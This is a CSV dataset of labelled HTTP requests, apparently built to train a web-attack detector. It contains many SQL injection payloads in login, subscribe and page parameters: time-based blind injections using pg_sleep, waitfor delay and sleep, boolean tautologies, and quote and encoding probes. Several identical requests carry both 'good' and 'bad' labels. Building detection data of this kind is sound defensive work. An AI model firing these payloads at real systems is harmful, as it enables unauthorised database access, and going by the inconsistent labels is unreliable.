method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=rpT1R3rf';select%20pg_sleep(6);%20--%20,1,0,1,1,3,3,bad
POST,/doLogin,"btnSubmit=Login&passw=%bf'%bf""&uid=1",1,1,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1%20waitfor%20delay%20'0:0:9'%20--%20,2,0,1,0,5,3,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2>(0%2b5%2b910-910)%20or%20'6N78EPpD'='&uid=1,4,0,0,1,4,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=BCC0EPDK';%20waitfor%20delay%20'0:0:9'%20--%20,3,0,1,0,5,3,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=if(now()=sysdate()%2csleep(3)%2c0),0,0,0,4,0,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1));select%20pg_sleep(6);%20--%20,0,0,1,1,3,3,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=JyI=,0,0,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1;select%20pg_sleep(3);%20--%20,0,0,1,1,3,3,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=5%20AND%20000910=000910%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1'""",1,1,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*0=6%20AND%20000910=000910%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%20000910=000910%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=BVaAyU50'));select%20pg_sleep(3);%20--%20,1,0,1,1,3,3,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1""%20OR%202%2b717-717-1=0%2b0%2b0%2b1%20--%20",0,1,1,0,4,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1%20OR%202%2b921-921-1=0%2b0%2b0%2b1%20--%20,0,0,1,0,4,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%20527=527%20AND%203%2b1-1-1=1%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1=1%20AND%20000910=000910%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%bf'%bf""",1,1,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1);%20waitfor%20delay%20'0:0:9'%20--%20,2,0,1,0,5,3,bad
POST,/doLogin,btnSubmit=Login&passw=1%00%c0%a7%c0%a2%252527%252522&uid=1,0,0,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=0'XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR'Z,2,0,0,5,0,2,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=sample%40email.tst,0,0,0,0,0,0,good
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=JyI=,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=sample%2540email.tst,0,0,0,0,0,0,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=0""XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR""Z",0,2,0,5,0,1,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1%00%c0%a7%c0%a2%252527%252522,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1'%20OR%202%2b842-842-1=0%2b0%2b0%2b1%20--%20,1,0,1,0,4,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1%20OR%202%2b980-980-1=0%2b0%2b0%2b1,0,0,0,0,2,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=%5c,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=rsfsEvmD');select%20pg_sleep(3);%20--%20,1,0,1,1,3,2,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1'%20OR%202%2b533-533-1=0%2b0%2b0%2b1%20or%20'YlzHGUjK'=',4,0,0,0,4,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1%20OR%202%2b78-78-1=0%2b0%2b0%2b1%20--%20,0,0,1,0,4,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=%40%40IkDem,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=0ZOIZmZr';%20waitfor%20delay%20'0:0:9'%20--%20,3,0,1,0,5,2,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1%20waitfor%20delay%20'0:0:6'%20--%20,2,0,1,0,5,2,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=1'""",1,1,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=lmSedIkd';select%20pg_sleep(9);%20--%20,1,0,1,1,3,2,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'""%2b(select(0)from(select(sleep(6)))v)%2b""*/",2,2,0,15,0,9,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=%bf'%bf""",1,1,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=RY0k269y'));select%20pg_sleep(3);%20--%20,1,0,1,1,3,2,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=%f0''%f0""""",2,2,0,0,0,0,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=-1""%20OR%202%2b751-751-1=0%2b0%2b0%2b1%20--%20",0,1,1,0,4,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=sample%40email.tst,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=if(now()=sysdate()%2csleep(9)%2c0),0,0,0,4,0,1,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z,2,0,0,5,0,1,bad
GET,/feedback.jsp,,0,0,0,0,0,0,good
GET,/feedback.jsp,,0,0,0,0,0,0,bad
GET,/Flash,,0,0,0,0,0,0,good
GET,/Flash/,,0,0,0,0,0,0,good
GET,/Flash/add.swf,,0,0,0,0,0,0,good
GET,/forgotpw,,0,0,0,0,0,0,good
POST,/forgotpw,<forgot><username>e</username></forgot>,0,0,0,0,0,0,good
GET,/guestbook.php,,0,0,0,0,0,0,good
POST,/guestbook.php,submit=add%20message&name=anonymous%20user&text=1,0,0,0,0,2,0,good
GET,/high_yield_investments.htm,,0,0,0,0,0,0,good
GET,/high_yield_investments.htm,,0,0,0,0,0,0,bad
GET,/hpp,,0,0,0,0,0,0,good
GET,/hpp/,,0,0,0,0,0,0,good
GET,/hpp/?pp=12,,0,0,0,0,0,0,good
GET,/hpp/index.php,,0,0,0,0,0,0,good
GET,/hpp/index.php?pp=12,,0,0,0,0,0,0,good
GET,/hpp/params.php,,0,0,0,0,0,0,good
GET,/hpp/params.php?aaaa=,,0,0,0,0,0,0,good
GET,/hpp/params.php?p=valid&pp=12,,0,0,0,0,0,0,good
GET,/hpp/test.php,,0,0,0,0,0,0,good
GET,/images,,0,0,0,0,0,0,bad
GET,/images,,0,0,0,0,0,0,good
GET,/images,,0,0,0,0,0,0,good
GET,/images,,0,0,0,0,0,0,good
GET,/images,,0,0,0,0,0,0,bad
GET,/images/,,0,0,0,0,0,0,good
GET,/index.bak,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,0,good
GET,/index.jsp,,0,0,0,0,0,2,bad
GET,/index.jsp?content=%40%40gieVw,,0,0,0,0,0,0,bad
GET,/index.jsp?content=%5c,,0,0,0,0,0,0,bad
GET,/index.jsp?content=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z,,2,0,0,5,0,1,bad
GET,/index.jsp?content=1%00%c0%a7%c0%a2%252527%252522,,0,0,0,0,0,0,bad
GET,/index.jsp?content=-1%20OR%202%2b158-158-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,bad
GET,/index.jsp?content=-1%20OR%202%2b774-774-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
GET,/index.jsp?content=-1%20OR%203%2b158-158-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,bad
GET,/index.jsp?content=-1%20OR%203%2b774-774-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
GET,/index.jsp?content=1%20waitfor%20delay%20'0:0:9'%20--%20,,2,0,1,0,5,2,bad
GET,/index.jsp?content=7ZP7fS6E';select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
GET,/index.jsp?content=business.htm,,0,0,0,0,0,0,good
GET,/index.jsp?content=business.htm,,0,0,0,0,0,0,bad
GET,/index.jsp?content=business_cards.htm,,0,0,0,0,0,0,good
GET,/index.jsp?content=business_cards.htm,,0,0,0,0,0,0,bad
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,good
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,bad
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,good
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,bad
GET,/index.jsp?content=business_lending.htm,,0,0,0,0,0,0,good
GET,/index.jsp?content=business_lending.htm,,0,0,0,0,0,0,bad
GET,/index.jsp?content=business_other.htm,,0,0,0,0,0,0,good
GET,/index.jsp?content=business_other.htm,,0,0,0,0,0,0,bad
GET,/index.jsp?content=business_retirement.htm,,0,0,0,0,0,0,good
GET,/index.jsp?content=business_retirement.htm,,0,0,0,0,0,0,bad
GET,/index.jsp?content=E86iPFjW,,0,0,0,0,0,0,bad
GET,/index.jsp?content=if(now()=sysdate()%2csleep(9)%2c0),,0,0,0,4,0,1,bad
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,good
GET,/index.jsp?content=inside.htm,,0,0,0,0,0,0,bad
GET,/index.jsp?content=inside_about.htm,,0,0,0,0,0,0,good
GET,/index.jsp?content=inside_about.htm,,0,0,0,0,0,0,bad
GET,/index.jsp?content=JyI=,,0,0,0,0,0,0,bad
GET,/index.jsp?content=personal_loans.htm,,0,0,0,0,0,0,good
GET,/index.jsp?content=personal_loans.htm,,0,0,0,0,0,0,bad
GET,/index.jsp?content=personal_loans.htm'%20AND%202*3*8=6*8%20AND%20'eMPA'='eMPA,,4,0,0,0,4,0,bad
GET,/index.jsp?content=personal_loans.htm%25'%20AND%202*3*8=6*8%20AND%20'PabG'!='PabG%25,,4,0,0,0,4,0,bad
GET,/index.jsp?content=rlMdnOi0';%20waitfor%20delay%20'0:0:3'%20--%20,,3,0,1,0,5,2,bad
GET,/index.jsp?content=Tke1HiYa'));select%20pg_sleep(9);%20--%20,,1,0,1,1,3,2,bad
GET,/index.jsp?content=zd4spQve');select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
GET,/index.php,,0,0,0,0,0,0,good
GET,/jscripts/tiny_mce/blank.htm,,0,0,0,0,0,0,bad
GET,/jscripts/tiny_mce/blank.htm,,0,0,0,0,0,0,good
GET,/jscripts/tiny_mce/langs/en.js,,0,0,0,0,0,0,bad
GET,/jscripts/tiny_mce/langs/en.js,,0,0,0,0,0,0,good
GET,/jscripts/tiny_mce/license.txt,,0,0,0,0,0,0,bad
GET,/jscripts/tiny_mce/license.txt,,0,0,0,0,0,0,good
GET,/jscripts/tiny_mce/themes/simple/editor_template.js,,0,0,0,0,0,0,bad
GET,/jscripts/tiny_mce/themes/simple/editor_template.js,,0,0,0,0,0,0,good
GET,/jscripts/tiny_mce/themes/simple/editor_template_src.js,,0,0,0,0,0,0,bad
GET,/jscripts/tiny_mce/themes/simple/editor_template_src.js,,0,0,0,0,0,0,good
GET,/jscripts/tiny_mce/tiny_mce.js,,0,0,0,0,0,0,bad
GET,/jscripts/tiny_mce/tiny_mce.js,,0,0,0,0,0,0,good
GET,/jscripts/tiny_mce/tiny_mce_popup.js,,0,0,0,0,0,0,bad
GET,/jscripts/tiny_mce/tiny_mce_popup.js,,0,0,0,0,0,0,good
GET,/jscripts/tiny_mce/tiny_mce_src.js,,0,0,0,0,0,0,bad
GET,/jscripts/tiny_mce/tiny_mce_src.js,,0,0,0,0,0,0,good
GET,/jscripts/tiny_mce/utils/form_utils.js,,0,0,0,0,0,0,bad
GET,/jscripts/tiny_mce/utils/form_utils.js,,0,0,0,0,0,0,good
GET,/jscripts/tiny_mce/utils/mctabs.js,,0,0,0,0,0,0,bad
GET,/jscripts/tiny_mce/utils/mctabs.js,,0,0,0,0,0,0,good
GET,/jscripts/tiny_mce/utils/validate.js,,0,0,0,0,0,0,bad
GET,/jscripts/tiny_mce/utils/validate.js,,0,0,0,0,0,0,good
GET,/listproducts.php,,0,0,0,0,0,0,good
GET,/listproducts.php?artist=1,,0,0,0,0,0,0,good
GET,/listproducts.php?artist=2,,0,0,0,0,0,0,good
GET,/listproducts.php?artist=3,,0,0,0,0,0,0,good
GET,/listproducts.php?cat=1,,0,0,0,0,0,0,good
GET,/listproducts.php?cat=2,,0,0,0,0,0,0,good
GET,/listproducts.php?cat=4,,0,0,0,0,0,0,good
POST,/login,password=g00dPa%24%24w0rD&username=admin,0,0,0,0,0,0,good
GET,/login.aspx,,0,0,0,0,0,0,bad
GET,/login.aspx,,0,0,0,0,0,0,good
POST,/login.aspx,btnLogin=Login&cbPersistCookie=1acuk8lvZiksOh&tbPassword=g00dPa%24%24w0rD&tbUsername=qxumediw&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,0,0,0,0,0,0,bad
POST,/login.aspx,btnLogin=Login&cbPersistCookie=on&tbPassword=1ACUSTART%5c&tbUsername=vfprmxgb&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,0,0,0,0,0,0,bad
POST,/login.aspx,btnLogin=Login&cbPersistCookie=on&tbPassword=g00dPa%24%24w0rD&tbUsername=1acuMx6jInPawg&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,0,0,0,0,0,0,bad
POST,/login.aspx,btnLogin=Login&tbPassword=1ACUSTART%5c&tbUsername=vfprmxgb&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,0,0,0,0,0,0,bad
POST,/login.aspx,btnLogin=Login&cbPersistCookie=on&tbPassword=GBSvlYjg&tbUsername=xklatmka&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,0,0,0,0,0,0,bad
POST,/login.aspx,btnLogin=Login&cbPersistCookie=on&tbPassword=g00dPa%24%24w0rD&tbUsername=xklatmka&__EVENTARGUMENT=1&__EVENTTARGET=1&__EVENTVALIDATION=/wEWWwLoz/fGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDAKJlpzeDwKOltTPCALcy6fWCQLcy6fWCQLcy9vqAgLcy9vqAgLcy4/SDwLcy4/SDwLcy6PpCALcy6PpCAKx0o2eCgKx0o2eCgKx0qG1AwKx0qG1AwKx0tXJDAKx0tXJDAKx0snsBQKx0snsBQKx0v2DDQKx0v2DDQKx0pGmBgKx0pGmBgKx0oX9DwKx0oX9DwKx0rmQBwKx0rmQBwKx0u35BQKx0u35BQKx0oGcDQKx0oGcDQKK%2bZMFAor5kwUCivmH2AkCivmH2AkCivm7/wICivm7/wICivmvkgoCivmvkgoCivnDtgMCivnDtgMCivn3zQwCivn3zQwCivnr4AUCivnr4AUCivmfhw0Civmfhw0Civnz7AsCivnz7AsCivnngwMCivnngwMCv5PTxAkCv5PTxAkCv5PHmwECv5PHmwECv5P7vgoCv5P7vgoCv5Pv1QMCv5Pv1QMCv5OD6AwCv5OD6AwCv5O3jwQCv5O3jwQCv5Orog0Cv5Orog0Cv5PfxgYCv5PfxgYCv5OzrgMCv5OzrgMCv5OnxQwCv5OnxQwCkLqx6g8CkLqx6g8CkLqlgQcCkLqlgQcCkLrZJQKQutklApC6zfgJApC6zfgJApC64Z8BApC64Z8BApC6lbIKApC6lbIKApC6ickDApC6ickDApC6vewMApC6vewM5kmGZVkGy5KL08oyC3oE/k/5jE4=&__VIEWSTATE=/wEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2bQ8XadeewSqHhJbH9z4dvJw==&__VIEWSTATEGENERATOR=C2EE9ABB,0,0,0,0,0,0,bad
